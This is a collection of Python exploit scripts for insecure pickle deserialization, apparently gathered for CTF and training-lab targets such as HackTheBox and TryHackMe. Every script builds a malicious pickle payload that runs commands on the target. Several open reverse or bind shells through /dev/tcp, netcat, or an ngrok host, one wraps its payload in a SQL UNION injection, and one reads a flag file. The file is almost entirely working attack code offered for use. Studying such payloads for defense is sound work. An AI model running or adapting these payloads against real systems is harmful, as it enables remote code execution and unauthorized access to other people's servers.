#!/usr/bin/python

##
##
https://0x00sec.org/t/pickle-insecure-deserialization-hackthebox-baby-website-rick/27130
##
##

# Pickle deserialization RCE payload.
# To be invoked with command to execute at it's first parameter.
# Otherwise, the default one will be used.
#

import cPickle
import sys
import base64

DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print base64.b64encode(cPickle.dumps(PickleRce()))
        
##
##

#!/usr/bin/python
#
# Pickle deserialization RCE exploit
# calfcrusher@inventati.org
#
# Usage: ./Pickle-PoC.py [URL]

import pickle
import base64
import requests
import sys

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

default_url = 'http://127.0.0.1:5000/vulnerable'
url = sys.argv[1] if len(sys.argv) > 1 else default_url
command = '/bin/bash -i >& /dev/tcp/192.168.1.23/4444 0>&1'  # Reverse Shell Payload Change IP/PORT

pickled = 'pickled'  # This is the POST parameter of our vulnerable Flask app
payload = base64.b64encode(pickle.dumps(PickleRCE()))  # Crafting Payload
requests.post(url, data={pickled: payload})  # Sending POST request

##
##

##
##

import pickle
import base64
import subprocess
from types import SimpleNamespace

payload = ['cat', 'flag.txt']

class FakeItem:
    def __init__(self):
        self.name = 'Hacked!'
        self.description = RCE()
        self.image = 'https://media.tenor.com/Ce309bmw-fQAAAAM/be.gif'
        self.price = '13.37'

    def __reduce__(self):
        return SimpleNamespace(**self.__dict__).__reduce__()

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (payload, ))

if __name__ == '__main__':
    print(base64.urlsafe_b64encode(pickle.dumps(FakeItem())).decode('ascii'))



##
##

import sys
import base64
import pickle
import urllib.parse
import requests

class Payload:

  def __reduce__(self):
    import os
    cmd = ("mkfifo /tmp/p; nc 0.tcp.ap.ngrok.io 15792 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p")
    return os.system, (cmd,)

if __name__ == "__main__":

  payload = base64.b64encode(pickle.dumps(Payload())).decode()

  payload = f"' UNION SELECT '{payload}' -- "

  payload = requests.utils.requote_uri(payload)

  print(payload)
  
##
##


#!/usr/bin/python
#
# Pickle deserialization RCE Exploit for TryHackme room https://tryhackme.com/room/owasptop10
# calfcrusher@inventati.org


import pickle
import base64
import requests


class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))


#command = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.10.10.10 4444 > /tmp/f"
url = "http://10.10.68.125/feedback"  # Change IP
command = "/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"  # Change IP and PORT

payload = base64.b64encode(pickle.dumps(PickleRCE()))  # Crafting payload
cookies = {"encodedPayload":payload}  # Create cookie
requests.get(url, cookies=cookies)  # Send GET request


##
##
